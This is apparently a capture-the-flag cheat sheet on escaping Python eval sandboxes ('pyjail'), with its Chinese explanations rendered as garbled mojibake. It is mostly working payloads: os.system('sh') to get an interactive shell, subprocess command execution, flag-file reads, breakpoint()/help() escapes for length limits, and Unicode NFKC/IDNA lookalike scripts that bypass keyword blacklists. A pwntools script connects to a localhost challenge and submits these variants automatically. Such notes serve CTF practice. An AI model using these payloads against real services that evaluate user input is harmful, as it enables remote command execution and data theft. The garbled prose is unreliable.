å…³é”®è¯ï¼šjail

ncæˆ–pythonè¿æ¥å…¥å£ï¼š
```
from pwn import *

server_ip = '127.0.0.1'
server_port = 26582

connection = remote(server_ip, server_port)

received_data = connection.recv().decode('utf-8')
send_data = received_data[-32:-26] + received_data[-23:-17]

print(received_data)

connection.sendline(send_data.encode('utf-8'))
connection.interactive()
connection.close()
```
ä¸€èˆ¬ä¼šç»™ä½ ä»£ç å®¡è®¡ï¼Œç„¶åè¿æ¥å…¥å£åè¾“å…¥payloadã€‚

```
åŸºç¡€ä»£ç 
eval(user_input_data)
```

^
## **payload**
ç›´æ¥é«˜æƒé™å‘½ä»¤è¯»
```
__import__('os').system('sh') è¿”å›äº¤äº’å¼shell

__import__('os').system('ls -al /tmp')

__import__('subprocess').run('cd /tmp && ls -al', shell=True)

open("flag").read()
```

ä½æƒé™æ–‡ä»¶è¯»
```
print(open('/tmp/therealflag_b8c7f31438c67cea772d2ea57dc77918').read())
```

é™åˆ¶é•¿åº¦
è¿”å›äº¤äº’å¼ç»ˆç«¯
```
breakpoint() ç„¶åè¾“å…¥py rce

help()  ç„¶åè¾“å…¥sysæˆ–os
```

é»‘åå•å°äº†
ä½¿ç”¨unicodeç»•è¿‡
```
from unicodedata import normalize
from string import ascii_lowercase
from collections import defaultdict

lst = list(ascii_lowercase)
dic = defaultdict(list)
for char in lst:
    for i in range(0x110000):
        if normalize("NFKC", chr(i)) == char:
            dic[char].append(chr(i))
        if len(dic[char]) > 9:
            break
print(dic)
```
```
åœ¨ç¢°æ’å‡ºæ¥çš„ç»“æœé‡Œæ‰¾å­—æ¯help/breakpointï¼Œç»è¿‡å°è¯•å¯å‘ç°helpä¸è¡Œï¼ŒæŠŠbreakpointçš„bæ”¹å­—ä½“å°±å¯ä»¥äº†ğ’·
```
è„šæœ¬æäº¤
```
from pwn import *
 
def start(ss):
 
    p = remote('localhost',52238)
 
    msg = p.recv()
 
    # print(msg)
 
    p.sendline(b'e')
 
    print(p.recv())
 
    p.sendline(ss)
 
    p.interactive()
 
s='breakpoint()'
 
#éœ€è¦ç»•è¿‡çš„å­—ç¬¦ä¸²
 
 
 
for i in range(128,65537):
 
    tmp=chr(i)
 
    try:
 
        res = tmp.encode('idna').decode('utf-8')
 
        if("--") in res:
 
            continue
 
        # print("U:{}    A:{}      ascii:{} ".format(tmp, res, i))
 
        if res in s and len(res)>0:
 
            print("U:{}    A:{}      ascii:{} ".format(tmp, res, i))
 
            start(s.replace(res,tmp))
 
            # break
 
    except:
 
        pass
```


^
## **ç»„åˆæ“ä½œ**
```
globals() è·å–å…¨å±€çš„å˜é‡çœ‹çœ‹æœ‰æ²¡æœ‰key
__main__ åŒç†
```